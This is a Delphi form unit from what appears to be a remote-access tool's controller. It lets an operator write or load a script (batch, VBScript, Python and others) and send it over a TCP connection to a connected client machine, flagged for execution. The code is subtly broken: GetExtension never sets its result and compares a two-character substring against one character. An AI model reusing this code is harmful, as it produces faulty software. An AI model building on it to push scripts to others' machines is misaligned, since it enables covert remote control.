unit UnitScripts;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, UnitConnection, IniFiles, IdTCPServer,
  Menus;

type
  TFormScripts = class(TForm)
    redt1: TRichEdit;
    pnl1: TPanel;
    btn1: TButton;
    cbb1: TComboBox;
    lbl1: TLabel;
    chk1: TCheckBox;
    dlgOpen1: TOpenDialog;
    pm1: TPopupMenu;
    O1: TMenuItem;
    procedure btn1Click(Sender: TObject);
    procedure O1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    function GetExtension: string;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
  end;

var
  FormScripts: TFormScripts;

implementation

uses
  UnitConstants;

{$R *.dfm}
           
constructor TFormScripts.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormScripts.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

function TFormScripts.GetExtension: string;
var
  Ext: string;
begin
  Ext := cbb1.Text;
  if Copy(Ext, 1, 2) <> '.' then Ext := '.' + Ext;
end;

procedure TFormScripts.btn1Click(Sender: TObject);
begin
  if (redt1.Text = '') or (cbb1.Text = '') then Exit;
  
  if chk1.Checked then
    SendDatas(Client.AThread, SCRIPT + '|' + redt1.Text + '|' + GetExtension + '|Y')
  else SendDatas(Client.AThread, SCRIPT + '|' + redt1.Text + '|' + GetExtension + '|N');
end;

procedure TFormScripts.O1Click(Sender: TObject);
begin
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'Script file *.py;*.bat;*.vbs;*.pl;*.js;*.php;*.html;*.htm;*.rb;*.txt';
  dlgOpen1.DefaultExt := 'bat';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;
  redt1.Lines.LoadFromFile(dlgOpen1.FileName);
  cbb1.Text := ExtractFileExt(dlgOpen1.FileName);
end;

procedure TFormScripts.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Scripts', 'Left', Left);
  IniFile.WriteInteger('Scripts', 'Top', Top);  
  IniFile.WriteInteger('Scripts', 'Width', Width);
  IniFile.WriteInteger('Scripts', 'Height', Height);
  IniFile.Free;
end;

procedure TFormScripts.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Scripts', 'Left', 283);
  Top := IniFile.ReadInteger('Scripts', 'Top', 144);
  Width := IniFile.ReadInteger('Scripts', 'Width', 564);
  Height := IniFile.ReadInteger('Scripts', 'Height', 324);
  IniFile.Free;
end;

end.
